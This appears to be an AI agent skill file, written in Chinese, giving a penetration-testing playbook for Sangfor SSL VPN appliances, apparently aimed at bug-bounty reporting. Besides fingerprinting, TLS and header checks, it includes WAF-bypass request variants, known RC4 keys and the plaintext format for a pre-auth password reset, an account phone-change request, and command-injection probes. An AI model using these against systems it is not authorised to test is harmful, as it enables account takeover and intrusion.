---
name: sangfor-ssl-vpn-testing-patterns
description: 深信服SSL VPN渗透测试模式 — 版本指纹/端点枚举/WAF绕过/changepwd集群攻击/信息泄露/TLS配置/登录流分析。覆盖M7.5~M7.6.9R2。
tags: [sangfor, vpn, ssl-vpn, pentest, rce, waf-bypass, src, education]
---

# 深信服 SSL VPN 渗透测试模式

## 触发条件
- 目标运行深信服 SSL VPN (Sangfor/EasyConnect)
- 需要测试 VPN 设备安全性
- 涉及 SF-PSIRT-20220032 / CNVD-2020-57240 / CNVD-2020-48680

## 版本指纹

### 登录页指纹 (无需认证)
```bash
curl -sk --max-time 10 'https://TARGET/por/login_auth.csp' | grep -E 'VPNVERSION|DeviceType|GMVERSION|Message'
```

响应 XML 关键字段:
- `<VPNVERSION>M7.6.8R2</VPNVERSION>` — 精确服务端版本
- `<DeviceType>ssl</DeviceType>` — ssl 或 vsp
- `<GMVERSION>1.1</GMVERSION>`
- `<Message>login auth success</Message>`

### 客户端版本泄露
```bash
curl -sk 'https://TARGET/por/ec_pkg.csp'
```
返回 XML 包含 Mac/Linux 客户端版本号和 alias。

### 受影响版本范围
- SF-PSIRT-20220032: M7.5 ~ M7.6.9R2 (CVSS 9.8)
- CNVD-2020-57240: <= 7.6.7 (url 参数命令注入)
- CNVD-2020-48680: M7.5 (升级维护工具)

## 端点枚举

### 核心 .csp 端点 (无需认证即可访问)
| 端点 | 正常响应 | 说明 |
|------|----------|------|
| `/por/login_auth.csp` | 200 XML | 版本+配置+RSA公钥泄露 |
| `/por/login_psw.csp` | 302/200 | 登录 POST 端点 |
| `/por/index.csp` | 200 HTML | 主页 |
| `/por/ec_pkg.csp` | 200 XML | 客户端版本信息 |
| `/por/changepwd.csp` | 200 XML | 密码修改 (clusterd) |
| `/por/changetelnum.csp` | 200 | 手机号修改 (clusterd) |
| `/por/balance_update.csp` | 200 | 返回 "0" |
| `/por/webfs.csp` | 200 | 重定向到 logout (需认证) |
| `/por/clusterdSync.csp` | 200 XML | 返回 `<Auth />` (需认证) |
| `/com/installClient.html` | 200 | 客户端安装页 |
| `/web/1/http/0/` | 403 | Web代理 (存在但拒绝) |

### 不存在的路径 (M7.6.8R2)
- `/cgi-bin/php-cgi/` — 全部 404 (旧版本 M5.x 的 PHP-CGI 已移除)
- `/admin/`, `/local/`, `/prx/`, `/svpn/` — 全部 404
- `/appSsoApi.php` — 404

### 管理端口
- 4430/4431/4443/8080/8443/9443/60443 — 通常不可达
- 8118 — 可能存在 TLS 握手但不响应

## changepwd.csp 集群密码重置

### 漏洞原理
旧版本通过 `sessReq=clusterd` 参数 + RC4 加密的 str 参数实现预认证密码重置。

### 已知 RC4 Key
- M7.6.1: `20100720`
- M7.6.6R1: `20181118`
- M7.6.8R2: **未公开**，且高版本据报道已移除相关函数

### RC4 明文格式
```
,username=TARGET,ip=127.0.0.1,grpid=1,pripsw=OLDPASS,newpsw=NEWPASS,
```

### WAF 规则 (重要发现)
changepwd.csp 的 WAF **精确匹配** `sessReq=clusterd` (小写)。

**WAF 绕过方式** (返回 200 而非 404):
```bash
# 大小写变体
curl -sk 'https://TARGET/por/changepwd.csp?sessReq=Clusterd&sessid=0'
curl -sk 'https://TARGET/por/changepwd.csp?sessReq=CLUSTERD&sessid=0'
# 参数名大小写
curl -sk 'https://TARGET/por/changepwd.csp?SESSREQ=clusterd&sessid=0'
# 空格/Tab 前缀
curl -sk 'https://TARGET/por/changepwd.csp?sessReq=%20clusterd&sessid=0'
curl -sk 'https://TARGET/por/changepwd.csp?sessReq=%09clusterd&sessid=0'
# 参数污染
curl -sk 'https://TARGET/por/changepwd.csp?sessReq=test&sessReq=clusterd&sessid=0'
```

**绕过后的行为**: 应用返回 `ErrorCode 20026 "unexpected user service"` — 端点存在但不识别变体参数。

### changetelnum.csp (不受 WAF 限制)
```bash
curl -sk 'https://TARGET/por/changetelnum.csp?sessReq=clusterd&sessid=0&username=admin&grpid=0&newtel=13800138000&ip=127.0.0.1'
```
错误码: `3` (需加密 str 参数) 或 `6` (解密失败/RC4 key 错误)

## 信息泄露清单

### login_auth.csp 泄露内容
- VPNVERSION, GMVERSION, DeviceType
- RSA_ENCRYPT_KEY (512字节十六进制公钥)
- RSA_ENCRYPT_EXP (通常 65537)
- CSRF_RAND_CODE
- ENABLE_RANDCODE (验证码开关)
- Anonymous (匿名登录)
- Deny_normal_user
- SSLCipherSuite (密码套件)
- SSLALGOR
- DKEY_VER_ENABLE, MID_ATK_CHECK
- RESET_PASSWORD, AllowBindSms
- enablethirdpartycert, enablewechatqrcode
- DomainSSOEnable, DomainSSOUrl
- Is_enable_mult_client

## TLS 配置检查

```bash
# 版本支持
for ver in tls1 tls1_1 tls1_2 tls1_3; do
  echo | openssl s_client -connect TARGET:443 -$ver 2>&1 | grep 'Protocol\|Cipher is'
done

# 3DES (SWEET32)
echo | openssl s_client -connect TARGET:443 -cipher 'DES-CBC3-SHA' 2>&1
```

常见发现:
- TLSv1.0/1.1 支持 → 中危
- TLSv1.3 不支持 → 配置缺陷
- 3DES 通常已禁用

## 命令注入验证方法论

### 三类安全验证指标
1. **echo 回显**: `HERMES_SAFE_PROBE_时间戳` 出现在响应体
2. **id 执行**: `uid=` / `gid=` 出现在响应体
3. **sleep 延迟**: sleep 5 请求耗时 ≈5s，对照 ≈0.5s

### 测试过的注入点 (M7.6.8R2 全部无效)
- `balance_update.csp?rcname=-h|id` → 返回 "0"
- `webfs.csp?rcid=x|id` → 重定向
- `clusterdSync.csp?cmd=id` → `<Auth />`
- `checkurl.csp?url=-h|id` → 404

### 注入分隔符测试
| 分隔符 | balance_update 响应 |
|--------|---------------------|
| `\|` (pipe) | "0" (接受但不执行) |
| `;` (semicolon) | 404 (WAF 拦截) |
| `` ` `` (backtick) | "0" |
| `$()` | "0" |
| `&&` / `\|\|` | "0" |
| `%0A` / `%0D` | 404 (WAF 拦截) |
| `%00` | "0" |

## 安全头检查

常见缺失:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy`
- `Referrer-Policy`
- `Permissions-Policy`

常见存在:
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block`
- `X-Robots-Tag: noindex, nofollow`

## 登录流分析

### 标准登录流
1. GET `/por/login_auth.csp` → 获取 TWFID cookie + CSRF_RAND_CODE + RSA_ENCRYPT_KEY
2. RSA 加密密码
3. POST `/por/login_psw.csp` → svpn_name + svpn_password + CSRF_RAND_CODE

### 登录错误码
- `20023` — 通用错误 (用户不存在或密码错误)
- `20004` — 可能用户存在 (不稳定，有时与 20023 混淆)
- `20041` — 可能账户锁定/密码过期

**注意**: 用户枚举在 M7.6.8R2 上不稳定，错误码可能因 WAF/rate-limit 统一化。

## SSRF 代理

`/web/1/http/0/<host>/` 和 `/web/1/https/0/<host>/` 路径存在但返回 403。
X-Forwarded-For 绕过无效。需要认证后才能使用。

## 可提交报告方向

### 确认可提交
1. **版本+配置信息泄露** (低危) — login_auth.csp 泄露 RSA 公钥+配置
2. **客户端版本泄露** (低危) — ec_pkg.csp
3. **TLS 1.0/1.1 支持** (中危)
4. **WAF 规则可绕过** (中危) — changepwd.csp clusterd 参数大小写绕过
5. **缺少 HSTS** (低危)

### 不建议提交
- RCE: 需要三类验证指标至少一个阳性
- changepwd 密码重置: M7.6.8R2 RC4 key 未知

## Pitfalls
1. **balance_update.csp 返回 "0" 不是注入成功** — 这是正常业务响应，必须检查响应体是否包含 uid=/gid=/token
2. **分号 (;) 被 WAF 拦截返回 404** — 不要反复测试分号，换其他分隔符
3. **changepwd.csp 的 WAF 是 case-sensitive** — `clusterd` 被拦但 `Clusterd` 不被拦
4. **changetelnum.csp 不受 changepwd WAF 规则影响** — 可直接传 `sessReq=clusterd`
5. **用户枚举不稳定** — 不同时间/频率测试结果可能不同，不要仅凭一次测试下结论
6. **ec_pkg.csp 注入无效** — 参数被忽略，只返回固定 XML
7. **管理端口 4430 通常不可达** — 不要浪费时间在端口扫描上
8. **旧 PHP-CGI 路径在 M7.6.8R2 上全部 404** — svpn.php/tsproxy.php 已移除

## References
- 官方通告: https://www.sangfor.com.cn/sec_center/details/66c17f8ec98a4bafa125782503f7e35e
- CNVD-2020-57240: https://www.cnvd.org.cn/flaw/show/CNVD-2020-57240
- DayDayPoc: https://www.ddpoc.com/DVB-2021-2446.html
- changepwd PoC: https://wiki.96.mk/ (PeiQi 文库)
- changetelnum: http://www.ol4three.com/2020/09/17/WEB/Exploit/深信服/
